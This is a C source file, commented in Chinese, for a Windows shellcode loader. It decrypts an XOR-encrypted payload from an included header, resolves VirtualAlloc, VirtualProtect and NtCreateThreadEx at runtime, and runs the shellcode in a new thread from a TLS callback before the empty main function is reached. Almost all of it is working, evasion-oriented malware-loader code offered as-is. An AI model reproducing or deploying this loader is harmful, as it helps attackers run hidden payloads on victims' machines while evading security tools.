#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include "enc_shellcode.h"

// XOR 解密函数
void decrypt(unsigned char *data, unsigned int len, unsigned char key) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// 动态解析 API（自定义简易 loader）
FARPROC resolve(LPCSTR dll, LPCSTR func) {
    HMODULE h = LoadLibraryA(dll);
    if (!h) return NULL;
    return GetProcAddress(h, func);
}

// TLS Callback 执行 shellcode
void NTAPI tls_callback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason != DLL_PROCESS_ATTACH) return;

    decrypt(shellcode, shellcode_len, 0x5C);

    LPVOID(WINAPI * pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) =
        (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))resolve("kernel32.dll", "VirtualAlloc");

    BOOL(WINAPI * pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) =
        (BOOL(WINAPI *)(LPVOID, SIZE_T, DWORD, PDWORD))resolve("kernel32.dll", "VirtualProtect");

    NTSTATUS(WINAPI * pNtCreateThreadEx)(
        PHANDLE, ACCESS_MASK, PVOID, HANDLE,
        LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID) =
        (NTSTATUS(WINAPI *)(
            PHANDLE, ACCESS_MASK, PVOID, HANDLE,
            LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
        ))resolve("ntdll.dll", "NtCreateThreadEx");

    HANDLE(WINAPI * pWaitForSingleObject)(HANDLE, DWORD) =
        (HANDLE(WINAPI *)(HANDLE, DWORD))resolve("kernel32.dll", "WaitForSingleObject");

    LPVOID addr = pVirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!addr) return;

    memcpy(addr, shellcode, shellcode_len);

    DWORD old = 0;
    pVirtualProtect(addr, shellcode_len, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = NULL;
    pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, (HANDLE)-1,
        (LPTHREAD_START_ROUTINE)addr, NULL, 0, 0, 0, 0, NULL);

    if (hThread) {
        pWaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

// 注册 TLS callback
#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:_tls_callback")
#else
__attribute__((section(".CRT$XLB"))) PIMAGE_TLS_CALLBACK _tls_callback = tls_callback;
#endif

// 空主函数，永不执行
int main() {
    return 0;
}
